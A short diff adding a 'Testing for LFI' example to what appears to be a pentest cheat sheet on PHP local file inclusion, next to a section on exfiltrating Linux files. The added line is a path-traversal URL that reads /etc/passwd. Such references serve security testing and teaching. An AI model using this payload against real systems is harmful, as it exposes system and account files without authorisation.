@@ -32,6 +32,11 @@ In versions of PHP below 5.3 can terminate with a null byte
 ?>
 ```
 
+*Testing for LFI:*
+```
+/script.php?page=../../../../../../../../etc/passwd
+```
+
 ## Exfiltrate Linux Files
 ```
 /etc/issue
